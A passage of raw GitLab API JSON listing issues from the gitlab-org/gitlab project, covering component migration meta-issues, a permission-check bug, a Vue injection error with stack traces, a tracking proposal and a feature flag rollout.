completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358935","notes":"https://gitlab.com/api/v4/projects/278964/issues/358935/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358935/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358935","relative":"#358935","full":"gitlab-org/gitlab#358935"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106580332,"iid":358934,"project_id":278964,"title":"[Meta] Migrate 2 components to Pajamas in 15.0","description":"This is a meta issue to track the development of ~\"group::code review\" ~frontend for migrating components to Pajamas.\n\nFrom previous milestone:\n\n- [x] https://gitlab.com/gitlab-org/gitlab/-/issues/325352+\n\nNew issues for 15.0:\n\n- [x] [Remove usage of bootstrap \"collapse\" within Geo registry pages](https://gitlab.com/gitlab-org/gitlab/-/issues/353688)\n- [ ] Issue 2 here","state":"closed","created_at":"2022-04-13T11:52:27.262Z","updated_at":"2022-05-24T12:00:23.100Z","closed_at":"2022-05-19T06:39:42.775Z","closed_by":{"id":10539680,"username":"slashmanov","name":"Stanislav Lashmanov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10539680/avatar.png","web_url":"https://gitlab.com/slashmanov"},"labels":["Deliverable","Pajamas","SUS::Non-impacting","devops::create","frontend","group::code review","pajamas::integrate","section::dev","type::maintenance"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":10539680,"username":"slashmanov","name":"Stanislav Lashmanov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10539680/avatar.png","web_url":"https://gitlab.com/slashmanov"}],"author":{"id":853414,"username":"andr3","name":"AndrÃ© LuÃ­s","state":"active","avatar_url":"https://secure.gravatar.com/avatar/241e39726efb512a29621070ccf26a90?s=80\u0026d=identicon","web_url":"https://gitlab.com/andr3"},"type":"ISSUE","assignee":{"id":10539680,"username":"slashmanov","name":"Stanislav Lashmanov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10539680/avatar.png","web_url":"https://gitlab.com/slashmanov"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358934","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":3,"completed_count":2},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"2 of 3 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358934","notes":"https://gitlab.com/api/v4/projects/278964/issues/358934/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358934/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358934","relative":"#358934","full":"gitlab-org/gitlab#358934"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106580329,"iid":358933,"project_id":278964,"title":"[Meta] Migrate 2 components to Pajamas in 15.0","description":"This is a meta issue to track the development of ~\"group::code review\" ~frontend for migrating components to Pajamas.\n\n- [ ] Issue 1 here\n- [ ] Issue 2 here","state":"closed","created_at":"2022-04-13T11:52:24.910Z","updated_at":"2022-05-24T12:00:23.174Z","closed_at":"2022-05-19T10:47:01.546Z","closed_by":{"id":853414,"username":"andr3","name":"AndrÃ© LuÃ­s","state":"active","avatar_url":"https://secure.gravatar.com/avatar/241e39726efb512a29621070ccf26a90?s=80\u0026d=identicon","web_url":"https://gitlab.com/andr3"},"labels":["Deliverable","Pajamas","SUS::Non-impacting","devops::create","frontend","group::code review","pajamas::integrate","section::dev","type::maintenance"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":3457201,"username":"viktomas","name":"Tomas Vik","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3457201/avatar.png","web_url":"https://gitlab.com/viktomas"}],"author":{"id":853414,"username":"andr3","name":"AndrÃ© LuÃ­s","state":"active","avatar_url":"https://secure.gravatar.com/avatar/241e39726efb512a29621070ccf26a90?s=80\u0026d=identicon","web_url":"https://gitlab.com/andr3"},"type":"ISSUE","assignee":{"id":3457201,"username":"viktomas","name":"Tomas Vik","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3457201/avatar.png","web_url":"https://gitlab.com/viktomas"},"user_notes_count":5,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358933","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":2,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 2 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358933","notes":"https://gitlab.com/api/v4/projects/278964/issues/358933/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358933/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358933","relative":"#358933","full":"gitlab-org/gitlab#358933"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106580327,"iid":358932,"project_id":278964,"title":"[Meta] Migrate 2 components to Pajamas in 15.0","description":"This is a meta issue to track the development of ~\"group::code review\" ~frontend for migrating components to Pajamas.\n\n- [x] https://gitlab.com/gitlab-org/gitlab/-/issues/361139\n- [x] https://gitlab.com/gitlab-org/gitlab/-/issues/361138","state":"closed","created_at":"2022-04-13T11:52:22.497Z","updated_at":"2022-06-21T12:01:44.053Z","closed_at":"2022-05-19T10:49:17.497Z","closed_by":{"id":853414,"username":"andr3","name":"AndrÃ© LuÃ­s","state":"active","avatar_url":"https://secure.gravatar.com/avatar/241e39726efb512a29621070ccf26a90?s=80\u0026d=identicon","web_url":"https://gitlab.com/andr3"},"labels":["Deliverable","Pajamas","SUS::Non-impacting","devops::create","frontend","group::code review","pajamas::integrate","section::dev","type::maintenance"],"milestone":{"id":2453022,"iid":73,"group_id":9970,"title":"15.1","description":"","state":"active","created_at":"2022-02-03T22:23:29.335Z","updated_at":"2022-02-03T22:23:29.335Z","due_date":"2022-06-17","start_date":"2022-05-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/73"},"assignees":[{"id":4414431,"username":"thomasrandolph","name":"Thomas Randolph","state":"active","avatar_url":"https://secure.gravatar.com/avatar/6462fcd577d8c957abd2dc23956cfbec?s=80\u0026d=identicon","web_url":"https://gitlab.com/thomasrandolph"}],"author":{"id":853414,"username":"andr3","name":"AndrÃ© LuÃ­s","state":"active","avatar_url":"https://secure.gravatar.com/avatar/241e39726efb512a29621070ccf26a90?s=80\u0026d=identicon","web_url":"https://gitlab.com/andr3"},"type":"ISSUE","assignee":{"id":4414431,"username":"thomasrandolph","name":"Thomas Randolph","state":"active","avatar_url":"https://secure.gravatar.com/avatar/6462fcd577d8c957abd2dc23956cfbec?s=80\u0026d=identicon","web_url":"https://gitlab.com/thomasrandolph"},"user_notes_count":5,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358932","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":2,"completed_count":2},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"2 of 2 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358932","notes":"https://gitlab.com/api/v4/projects/278964/issues/358932/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358932/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358932","relative":"#358932","full":"gitlab-org/gitlab#358932"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106580320,"iid":358931,"project_id":278964,"title":"Order of permission check on project owner creation is too important","description":"The following discussion from !84105 should be addressed:\n\n- [ ] @ifarkas started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/84105#note_911279028):  (+1 comment)\n\n    \u003e Thanks for the detailed comment. Just curious: how does `CurrentUserMode` make project creation fail? Maybe we should fix admin mode in a follow-up? :thinking:\n\n# Investigation results\n\nhttps://gitlab.com/gitlab-org/gitlab/-/issues/358931#note_938314791\n\n# Plan\n\nPurge the cache as needed","state":"closed","created_at":"2022-04-13T11:52:05.564Z","updated_at":"2022-05-12T15:47:15.630Z","closed_at":"2022-05-12T15:47:15.596Z","closed_by":{"id":3841241,"username":"dstull","name":"Doug Stull","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c2d7b8532bca28f593b193b012841a40?s=80\u0026d=identicon","web_url":"https://gitlab.com/dstull"},"labels":["auto updated","bug::transient","devops::growth","group::acquisition","section::growth","type::bug","workflow::in review"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":3841241,"username":"dstull","name":"Doug Stull","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c2d7b8532bca28f593b193b012841a40?s=80\u0026d=identicon","web_url":"https://gitlab.com/dstull"}],"author":{"id":3841241,"username":"dstull","name":"Doug Stull","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c2d7b8532bca28f593b193b012841a40?s=80\u0026d=identicon","web_url":"https://gitlab.com/dstull"},"type":"ISSUE","assignee":{"id":3841241,"username":"dstull","name":"Doug Stull","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c2d7b8532bca28f593b193b012841a40?s=80\u0026d=identicon","web_url":"https://gitlab.com/dstull"},"user_notes_count":6,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358931","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":1,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 1 checklist item completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358931","notes":"https://gitlab.com/api/v4/projects/278964/issues/358931/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358931/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358931","relative":"#358931","full":"gitlab-org/gitlab#358931"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106579585,"iid":358927,"project_id":278964,"title":"Three CTA Experiment bug","description":"## Problem\n\n1. On Gitlab.com or on simulating SaaS with `Feature.enable(:pql_three_cta_test)`\n1. Go to any free group security discovery moment http://gdk.test:3000/groups/donkey1/-/security/discover\n1. The hand raise button will not be available,\n\n```js\nvue.runtime.esm.js?fbcf:619 [Vue warn]: Injection \"ctaTracking\" not found\n\nfound in\n\n---\u003e \u003cHandRaiseLeadButton\u003e at ee/app/assets/javascripts/hand_raise_leads/hand_raise_lead/components/hand_raise_lead_button.vue\n       \u003cGitlabExperiment\u003e at experimentation/components/gitlab_experiment.vue\n         \u003cSecurityDiscoverApp\u003e at ee/app/assets/javascripts/vue_shared/discover/card_security_discover_app.vue\n           \u003cRoot\u003e\nwarn @ vue.runtime.esm.js?fbcf:619\nresolveInject @ vue.runtime.esm.js?fbcf:2477\ninitInjections @ vue.runtime.esm.js?fbcf:2427\nVue._init @ vue.runtime.esm.js?fbcf:5005\nVueComponent @ vue.runtime.esm.js?fbcf:5154\ncreateComponentInstanceForVnode @ vue.runtime.esm.js?fbcf:3283\ninit @ vue.runtime.esm.js?fbcf:3114\ncreateComponent @ vue.runtime.esm.js?fbcf:5978\ncreateElm @ vue.runtime.esm.js?fbcf:5925\npatch @ vue.runtime.esm.js?fbcf:6477\nVue._update @ vue.runtime.esm.js?fbcf:3945\nupdateComponent @ vue.runtime.esm.js?fbcf:4066\nget @ vue.runtime.esm.js?fbcf:4479\nWatcher @ vue.runtime.esm.js?fbcf:4468\nmountComponent @ vue.runtime.esm.js?fbcf:4073\nVue.$mount @ vue.runtime.esm.js?fbcf:8415\ninit @ vue.runtime.esm.js?fbcf:3118\ncreateComponent @ vue.runtime.esm.js?fbcf:5978\ncreateElm @ vue.runtime.esm.js?fbcf:5925\ncreateChildren @ vue.runtime.esm.js?fbcf:6053\ncreateElm @ vue.runtime.esm.js?fbcf:5954\ncreateChildren @ vue.runtime.esm.js?fbcf:6053\ncreateElm @ vue.runtime.esm.js?fbcf:5954\npatch @ vue.runtime.esm.js?fbcf:6477\nVue._update @ vue.runtime.esm.js?fbcf:3945\nupdateComponent @ vue.runtime.esm.js?fbcf:4066\nget @ vue.runtime.esm.js?fbcf:4479\nWatcher @ vue.runtime.esm.js?fbcf:4468\nmountComponent @ vue.runtime.esm.js?fbcf:4073\nVue.$mount @ vue.runtime.esm.js?fbcf:8415\ninit @ vue.runtime.esm.js?fbcf:3118\ncreateComponent @ vue.runtime.esm.js?fbcf:5978\ncreateElm @ vue.runtime.esm.js?fbcf:5925\npatch @ vue.runtime.esm.js?fbcf:6516\nVue._update @ vue.runtime.esm.js?fbcf:3945\nupdateComponent @ vue.runtime.esm.js?fbcf:4066\nget @ vue.runtime.esm.js?fbcf:4479\nWatcher @ vue.runtime.esm.js?fbcf:4468\nmountComponent @ vue.runtime.esm.js?fbcf:4073\nVue.$mount @ vue.runtime.esm.js?fbcf:8415\nVue._init @ vue.runtime.esm.js?fbcf:5018\nVue @ vue.runtime.esm.js?fbcf:5085\neval @ card_security_discover_bundle.js?3499:35\neval @ index.js?5822:3\nsUjF @ pages.groups.security.discover.show.chunk.js:325\n__webpack_require__ @ runtime.bundle.js:854\nfn @ runtime.bundle.js:151\n743 @ pages.groups.security.discover.show.chunk.js:62\n__webpack_require__ @ runtime.bundle.js:854\ncheckDeferredModules @ runtime.bundle.js:46\nwebpackJsonpCallback @ runtime.bundle.js:33\n(anonymous) @ pages.groups.security.discover.show.chunk.js:1\nShow 22 more frames\nvue.runtime.esm.js?fbcf:619 [Vue warn]: Property or method \"ctaTracking\" is not defined on the instance but referenced during render. Make sure that this property is reactive, either in the data option, or for class-based components, by initializing the property. See: https://vuejs.org/v2/guide/reactivity.html#Declaring-Reactive-Properties.\n\nfound in\n\n---\u003e \u003cHandRaiseLeadButton\u003e at ee/app/assets/javascripts/hand_raise_leads/hand_raise_lead/components/hand_raise_lead_button.vue\n       \u003cGitlabExperiment\u003e at experimentation/components/gitlab_experiment.vue\n         \u003cSecurityDiscoverApp\u003e at ee/app/assets/javascripts/vue_shared/discover/card_security_discover_app.vue\n           \u003cRoot\u003e\nwarn @ vue.runtime.esm.js?fbcf:619\nwarnNonPresent @ vue.runtime.esm.js?fbcf:2015\nget @ vue.runtime.esm.js?fbcf:2070\nrender @ hand_raise_lead_button.vue?f36d:24\nVue._render @ vue.runtime.esm.js?fbcf:3548\nupdateComponent @ vue.runtime.esm.js?fbcf:4066\nget @ vue.runtime.esm.js?fbcf:4479\nWatcher @ vue.runtime.esm.js?fbcf:4468\nmountComponent @ vue.runtime.esm.js?fbcf:4073\nVue.$mount @ vue.runtime.esm.js?fbcf:8415\ninit @ vue.runtime.esm.js?fbcf:3118\ncreateComponent @ vue.runtime.esm.js?fbcf:5978\ncreateElm @ vue.runtime.esm.js?fbcf:5925\npatch @ vue.runtime.esm.js?fbcf:6477\nVue._update @ vue.runtime.esm.js?fbcf:3945\nupdateComponent @ vue.runtime.esm.js?fbcf:4066\nget @ vue.runtime.esm.js?fbcf:4479\nWatcher @ vue.runtime.esm.js?fbcf:4468\nmountComponent @ vue.runtime.esm.js?fbcf:4073\nVue.$mount @ vue.runtime.esm.js?fbcf:8415\ninit @ vue.runtime.esm.js?fbcf:3118\ncreateComponent @ vue.runtime.esm.js?fbcf:5978\ncreateElm @ vue.runtime.esm.js?fbcf:5925\ncreateChildren @ vue.runtime.esm.js?fbcf:6053\ncreateElm @ vue.runtime.esm.js?fbcf:5954\ncreateChildren @ vue.runtime.esm.js?fbcf:6053\ncreateElm @ vue.runtime.esm.js?fbcf:5954\npatch @ vue.runtime.esm.js?fbcf:6477\nVue._update @ vue.runtime.esm.js?fbcf:3945\nupdateComponent @ vue.runtime.esm.js?fbcf:4066\nget @ vue.runtime.esm.js?fbcf:4479\nWatcher @ vue.runtime.esm.js?fbcf:4468\nmountComponent @ vue.runtime.esm.js?fbcf:4073\nVue.$mount @ vue.runtime.esm.js?fbcf:8415\ninit @ vue.runtime.esm.js?fbcf:3118\ncreateComponent @ vue.runtime.esm.js?fbcf:5978\ncreateElm @ vue.runtime.esm.js?fbcf:5925\npatch @ vue.runtime.esm.js?fbcf:6516\nVue._update @ vue.runtime.esm.js?fbcf:3945\nupdateComponent @ vue.runtime.esm.js?fbcf:4066\nget @ vue.runtime.esm.js?fbcf:4479\nWatcher @ vue.runtime.esm.js?fbcf:4468\nmountComponent @ vue.runtime.esm.js?fbcf:4073\nVue.$mount @ vue.runtime.esm.js?fbcf:8415\nVue._init @ vue.runtime.esm.js?fbcf:5018\nVue @ vue.runtime.esm.js?fbcf:5085\neval @ card_security_discover_bundle.js?3499:35\neval @ index.js?5822:3\nsUjF @ pages.groups.security.discover.show.chunk.js:325\n__webpack_require__ @ runtime.bundle.js:854\nfn @ runtime.bundle.js:151\n743 @ pages.groups.security.discover.show.chunk.js:62\n__webpack_require__ @ runtime.bundle.js:854\ncheckDeferredModules @ runtime.bundle.js:46\nwebpackJsonpCallback @ runtime.bundle.js:33\n(anonymous) @ pages.groups.security.discover.show.chunk.js:1\nShow 26 more frames\nvue.runtime.esm.js?fbcf:619 [Vue warn]: Error in render: \"TypeError: Cannot read properties of undefined (reading 'action')\"\n\nfound in\n\n---\u003e \u003cHandRaiseLeadButton\u003e at ee/app/assets/javascripts/hand_raise_leads/hand_raise_lead/components/hand_raise_lead_button.vue\n       \u003cGitlabExperiment\u003e at experimentation/components/gitlab_experiment.vue\n         \u003cSecurityDiscoverApp\u003e at ee/app/assets/javascripts/vue_shared/discover/card_security_discover_app.vue\n           \u003cRoot\u003e\nwarn @ vue.runtime.esm.js?fbcf:619\nlogError @ vue.runtime.esm.js?fbcf:1884\nglobalHandleError @ vue.runtime.esm.js?fbcf:1879\nhandleError @ vue.runtime.esm.js?fbcf:1839\nVue._render @ vue.runtime.esm.js?fbcf:3550\nupdateComponent @ vue.runtime.esm.js?fbcf:4066\nget @ vue.runtime.esm.js?fbcf:4479\nWatcher @ vue.runtime.esm.js?fbcf:4468\nmountComponent @ vue.runtime.esm.js?fbcf:4073\nVue.$mount @ vue.runtime.esm.js?fbcf:8415\ninit @ vue.runtime.esm.js?fbcf:3118\ncreateComponent @ vue.runtime.esm.js?fbcf:5978\ncreateElm @ vue.runtime.esm.js?fbcf:5925\npatch @ vue.runtime.esm.js?fbcf:6477\nVue._update @ vue.runtime.esm.js?fbcf:3945\nupdateComponent @ vue.runtime.esm.js?fbcf:4066\nget @ vue.runtime.esm.js?fbcf:4479\nWatcher @ vue.runtime.esm.js?fbcf:4468\nmountComponent @ vue.runtime.esm.js?fbcf:4073\nVue.$mount @ vue.runtime.esm.js?fbcf:8415\ninit @ vue.runtime.esm.js?fbcf:3118\ncreateComponent @ vue.runtime.esm.js?fbcf:5978\ncreateElm @ vue.runtime.esm.js?fbcf:5925\ncreateChildren @ vue.runtime.esm.js?fbcf:6053\ncreateElm @ vue.runtime.esm.js?fbcf:5954\ncreateChildren @ vue.runtime.esm.js?fbcf:6053\ncreateElm @ vue.runtime.esm.js?fbcf:5954\npatch @ vue.runtime.esm.js?fbcf:6477\nVue._update @ vue.runtime.esm.js?fbcf:3945\nupdateComponent @ vue.runtime.esm.js?fbcf:4066\nget @ vue.runtime.esm.js?fbcf:4479\nWatcher @ vue.runtime.esm.js?fbcf:4468\nmountComponent @ vue.runtime.esm.js?fbcf:4073\nVue.$mount @ vue.runtime.esm.js?fbcf:8415\ninit @ vue.runtime.esm.js?fbcf:3118\ncreateComponent @ vue.runtime.esm.js?fbcf:5978\ncreateElm @ vue.runtime.esm.js?fbcf:5925\npatch @ vue.runtime.esm.js?fbcf:6516\nVue._update @ vue.runtime.esm.js?fbcf:3945\nupdateComponent @ vue.runtime.esm.js?fbcf:4066\nget @ vue.runtime.esm.js?fbcf:4479\nWatcher @ vue.runtime.esm.js?fbcf:4468\nmountComponent @ vue.runtime.esm.js?fbcf:4073\nVue.$mount @ vue.runtime.esm.js?fbcf:8415\nVue._init @ vue.runtime.esm.js?fbcf:5018\nVue @ vue.runtime.esm.js?fbcf:5085\neval @ card_security_discover_bundle.js?3499:35\neval @ index.js?5822:3\nsUjF @ pages.groups.security.discover.show.chunk.js:325\n__webpack_require__ @ runtime.bundle.js:854\nfn @ runtime.bundle.js:151\n743 @ pages.groups.security.discover.show.chunk.js:62\n__webpack_require__ @ runtime.bundle.js:854\ncheckDeferredModules @ runtime.bundle.js:46\nwebpackJsonpCallback @ runtime.bundle.js:33\n(anonymous) @ pages.groups.security.discover.show.chunk.js:1\nShow 26 more frames\nvue.runtime.esm.js?fbcf:1888 TypeError: Cannot read properties of undefined (reading 'action')\n    at Proxy.render (hand_raise_lead_button.vue?f36d:24:1)\n    at VueComponent.Vue._render (vue.runtime.esm.js?fbcf:3548:1)\n    at VueComponent.updateComponent (vue.runtime.esm.js?fbcf:4066:1)\n    at Watcher.get (vue.runtime.esm.js?fbcf:4479:1)\n    at new Watcher (vue.runtime.esm.js?fbcf:4468:1)\n    at mountComponent (vue.runtime.esm.js?fbcf:4073:1)\n    at VueComponent.Vue.$mount (vue.runtime.esm.js?fbcf:8415:1)\n    at init (vue.runtime.esm.js?fbcf:3118:1)\n    at createComponent (vue.runtime.esm.js?fbcf:5978:1)\n    at createElm (vue.runtime.esm.js?fbcf:5925:1)\n\n```\n\n## Solution\n\nMake sure provide/inject is available\n\nAdd a ctaTracking variable https://gitlab.com/gitlab-org/gitlab/-/merge_requests/80123","state":"closed","created_at":"2022-04-13T11:38:41.994Z","updated_at":"2022-04-14T17:05:08.686Z","closed_at":"2022-04-14T17:05:08.667Z","closed_by":{"id":4409816,"username":"a_akgun","name":"Alper Akgun","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4409816/avatar.png","web_url":"https://gitlab.com/a_akgun"},"labels":["Engineering","devops::growth","feature flag","group::acquisition","growth experiment","section::growth","type::bug"],"milestone":{"id":1212252,"iid":48,"group_id":9970,"title":"Next 1-3 releases","description":"Issues which are not quite ready to schedule, but should be considered as part of the near-term roadmap.","state":"active","created_at":"2020-03-26T20:39:10.889Z","updated_at":"2020-03-26T20:39:10.889Z","due_date":null,"start_date":null,"expired":false,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/48"},"assignees":[{"id":4409816,"username":"a_akgun","name":"Alper Akgun","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4409816/avatar.png","web_url":"https://gitlab.com/a_akgun"}],"author":{"id":4409816,"username":"a_akgun","name":"Alper Akgun","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4409816/avatar.png","web_url":"https://gitlab.com/a_akgun"},"type":"ISSUE","assignee":{"id":4409816,"username":"a_akgun","name":"Alper Akgun","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4409816/avatar.png","web_url":"https://gitlab.com/a_akgun"},"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358927","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358927","notes":"https://gitlab.com/api/v4/projects/278964/issues/358927/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358927/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358927","relative":"#358927","full":"gitlab-org/gitlab#358927"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106566877,"iid":358912,"project_id":278964,"title":"Frontend: Track the usage of the pipeline editor drawer","description":"## Problem\n\nCurrently we don't gather any data around how many users open the pipeline editor drawer, and which links they click on. \n\n## Proposal\n\nThe following information would be useful to us in making good design decisions:\n\n- How many users open the drawer\n- What links inside the drawer they click on\n\nThis can all be done in the ~frontend using Snowplow.\nAn example of this usage can be seen on the [browse templates button](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/pipeline_editor/components/editor/ci_editor_header.vue#L27)\nThere's also [slides from the snowplow workshop](https://docs.google.com/presentation/d/16FlzwToS6ps8X7HFtoeVeumZI6TICLnzxmccg7VZlXE/edit#slide=id.gcda8f7e915_0_17) that should help with getting this done.\n\n\u003c!--\nIf we can't measure it directly we could try to measure how many users land on the CI YAML reference page (and other pages linked in the drawer) from the drawer vs. other places like docs or googling YAML reference\n--\u003e","state":"closed","created_at":"2022-04-13T07:57:52.329Z","updated_at":"2022-06-15T07:44:50.054Z","closed_at":"2022-06-15T07:44:50.036Z","closed_by":{"id":7598233,"username":"mgandres","name":"Mireya Andres","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c96bce45a06f2dd722144db3f52456bf?s=80\u0026d=identicon","web_url":"https://gitlab.com/mgandres"},"labels":["Category:Pipeline Authoring","auto updated","candidate::15.1","devops::verify","frontend","frontend-weight::2","group::pipeline authoring","section::ops","workflow::production"],"milestone":{"id":2453022,"iid":73,"group_id":9970,"title":"15.1","description":"","state":"active","created_at":"2022-02-03T22:23:29.335Z","updated_at":"2022-02-03T22:23:29.335Z","due_date":"2022-06-17","start_date":"2022-05-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/73"},"assignees":[{"id":7598233,"username":"mgandres","name":"Mireya Andres","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c96bce45a06f2dd722144db3f52456bf?s=80\u0026d=identicon","web_url":"https://gitlab.com/mgandres"}],"author":{"id":4706959,"username":"nadia_sotnikova","name":"Nadia Sotnikova","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4706959/avatar.png","web_url":"https://gitlab.com/nadia_sotnikova"},"type":"ISSUE","assignee":{"id":7598233,"username":"mgandres","name":"Mireya Andres","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c96bce45a06f2dd722144db3f52456bf?s=80\u0026d=identicon","web_url":"https://gitlab.com/mgandres"},"user_notes_count":33,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358912","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358912","notes":"https://gitlab.com/api/v4/projects/278964/issues/358912/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358912/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358912","relative":"#358912","full":"gitlab-org/gitlab#358912"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":{"id":52751,"iid":67,"sequence":18,"group_id":9970,"title":null,"description":"Target milestone `15.2`","state":3,"created_at":"2022-04-03T00:05:01.966Z","updated_at":"2022-06-27T00:05:02.118Z","start_date":"2022-06-13","due_date":"2022-06-26","web_url":"https://gitlab.com/groups/gitlab-org/-/iterations/52751"},"health_status":null},{"id":106566611,"iid":358911,"project_id":278964,"title":"[Feature flag] Roll out `environment_multiple_stop_actions`","description":"\u003c!-- Title suggestion: [Feature flag] Enable description of feature --\u003e\n\n## Summary\n\nThis issue is to rollout [multiple stop actions](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/84922) for the Environments page on production,\nthat is currently behind the `environment_multiple_stop_actions` feature flag.\n\nRelated issue : https://gitlab.com/gitlab-org/gitlab/-/issues/22456\n\n\u003c!-- Short description of what the feature is about and link to relevant other issues. --\u003e\n\n## Owners\n\n- Team: `group::release`\n- Most appropriate slack channel to reach out to: `#s_release`\n- Best individual to reach out to: @bala.kumar \n- PM:@cbalane\n\n## 